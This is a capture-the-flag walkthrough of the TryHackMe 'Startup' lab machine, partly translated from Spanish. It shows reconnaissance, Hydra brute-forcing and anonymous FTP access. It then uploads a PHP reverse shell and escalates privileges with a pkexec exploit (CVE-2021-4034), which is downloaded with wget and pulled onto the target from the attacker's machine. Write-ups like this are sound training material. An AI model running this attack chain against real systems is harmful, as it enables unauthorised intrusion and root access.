# Startup

## General Information

<h3>Difficulty: <img src="https://img.shields.io/badge/Easy%20-green?style=flat-square"> </h3>

<h3> Operating system: Linux </h3> 

<h3> Exploited vulnerability: Reverse shell y el binario pkexec </h3>

<h3> DAta of resolution: 30/06/2025 </h3>

<h3>Link machine virtual: <a href="https://tryhackme.com/room/startup" target="_blank">Startup</a></h3>

### *read this document in espagnol :* <a href="startup.md">Startup</a>

## Recognition

TryHackme provides us with the IP of the target machine **target_ip**

I'm going to set the IP of the target mv in the **/etc/hosts** file, I'm going to call it the **Name you want to give it**

<p align="center"> 
<img src="images/startup.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 <ip de la maquina objetivo>
```

**The ttl is 63, so it's Linux**

### Scanning for open ports

#### TCP port scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn startup
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                                         |
| --------- | ------- | ----------------------------------------------- |
| 21        | ftp     | syn-ack ttl 63 vsftpd 3.0.3                     |
| 22        | ssh     | syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80        | http    | yn-ack ttl 63 Apache httpd 2.4.18               |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn startup
```

<p align="center"> 
<img src="images/UDP.png" width="600" alt="Resultado de Nmap">
</p>

All ports are closed.

Next, we'll try to detect any vulnerabilities with nmap using the following command:

## Exploración

```
http://startup/
```

<p align="center"> 
<img src="images/startup1.png" width="600" alt="Resultado de Nmap">
</p>

```
No hot peppers here! Excuse us while we develop our site. We want it to be the most elegant and convenient way to buy peppers. Also, we need a web developer. By the way, if you're a web developer, please contact us. If not, don't worry. We'll be online soon! — Development Team
```

### Fuzzing web

```
gobuster dir -u http://ip_obejtivo/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

```
http://startup/files/
```

<p align="center"> 
<img src="images/files.png" width="600" alt="Resultado de Nmap">
</p>

I save it in a folder and investigate the files.

```
cat notice.txt
```

```
Whoever's leaving these damn Among Us memes on this site isn't funny. People downloading documents from our website will think we're a joke! Now I don't know who it is, but Maya seems pretty suspicious.
```

Maya is very curious to me, and we have the ssh port open... **In the end it didn't work**

### Hydra

```
hydra -l maya -P /usr/share/wordlists/rockyou.txt ftp://startup 
```

<p align="center"> 
<img src="images/hydra.png" width="600" alt="Resultado de Nmap">
</p>

**But I get nothing**

### Estenografía

We'll use some stenography tool to see if we can get something.

```
steghide extract -sf important.jpg 
```

<p align="center"> 
<img src="images/steghide.png" width="600" alt="Resultado de Nmap">
</p>

**Nothing**

We visualize the image

<p align="center"> 
<img src="images/among.png" width="600" alt="Resultado de Nmap">
</p>

## FTP

When I perform the **nmap** scan I realize that on the FTP server the **anonymous** user is active, whenever the **anonymous** user is there the password is empty.

```
ftp anonymous@startup
ls -la
```

<p align="center"> 
<img src="images/ftp.png" width="600" alt="Resultado de Nmap">
</p>

I notice there is a hidden directory, I download it

```
put .test.log
cat .test.log
```

<p align="center"> 
<img src="images/test.png" width="600" alt="Resultado de Nmap">
</p>

**Nothing interesting** 

## Exploitation

I notice that the **ftp** folder has all permissions, and inside it we can get a malicious **reverse-shell** file and gain access.

```
locate reverse-shell
```

<p align="center"> 
<img src="images/reverse.png" width="600" alt="Resultado de Nmap">
</p>

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
```

<p align="center"> 
<img src="images/cp.png" width="600" alt="Resultado de Nmap">
</p>

I use **visual code** to modify this specific part of the file:

<p align="center"> 
<img src="images/reverse2.png" width="600" alt="Resultado de Nmap">
</p>

We upload it to the ftp service:

```
put reverse.php
```

<p align="center"> 
<img src="images/put.png" width="600" alt="Resultado de Nmap">
</p>

## Post-Exploitation

### I need to get a more stable connection

#### TTY

```
script /dev/null -c bash
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Then we find the first answer to the first question of tryhackme

```
ls
cat recipe.txt 
```

<p align="center"> 
<img src="images/love.png" width="600" alt="Resultado de Nmap">
</p>

```
Someone asked me what the main ingredient in our spice soup was today. I thought I couldn't keep it a secret forever, so I told them it was love.
```

We already have the first question resolved **love**

I'm investigating to find the user's flag network but...

<p align="center"> 
<img src="images/lennie.png" width="600" alt="Resultado de Nmap">
</p>

When I access the user folder, it turns out that to access the user folder, I have to be **lennie**, or **root**...

### Privilege Escalation

#### First command:

```
sudo -l
```

It asks us for the password, and nothing.

#### Segundo comando:

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/pkexec.png" width="600" alt="Resultado de Nmap">
</p>

I'm going to try escalating privileges with the **pkexec** binary.

Whenever we have the opportunity to escalate privileges with **pkexec**, we Google the following:

```
github pkexec privilege escalation
```

<p align="center"> 
<img src="images/exploit.png" width="600" alt="Resultado de Nmap">
</p>


To download it with **wget** we would only have to go <a href="https://github.com/NxPnch/pkexec-exploit" target="_blank">here</a> and we copy the url

<p align="center"> 
<img src="images/exploit2.png" width="600" alt="Resultado de Nmap">
</p>

```
wget https://raw.githubusercontent.com/NxPnch/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```

Then I change the name to make it easier

<p align="center"> 
<img src="images/cve.png" width="600" alt="Resultado de Nmap">
</p>


I share the file with this command

```
python -m http.server 80
```

Then, located in the **/tmp** folder, I get the file with the following command:

```
wget http://ipMaquinaAtacante/exploit.py
```

<p align="center"> 
<img src="images/exploit3.png" width="600" alt="Resultado de Nmap">
</p>

```
chmod +x exploit.py
./exploit.py
whoami
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

To get the first flag:

```
cd /home/lennie
cat user.txt
```

<p align="center"> 
<img src="images/flag1.png" width="600" alt="Resultado de Nmap">
</p>

To get the second flag:

```
cd /root
cat root
```

<p align="center"> 
<img src="images/flag2.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

On this machine I learned the following: pay attention to the small details, especially folder permissions. When I was logged into the FTP server and noticed that the FTP folder had all the permissions, I had the idea to create a malicious reverse shell file and access the terminal. Later, in the privilege escalation, it was quite easy for me because when I saw the pkexec binary, I had already carried out an exploit that I had prepared from other practices. When you have already solved a few machines, it shows! Let's keep exploiting machines.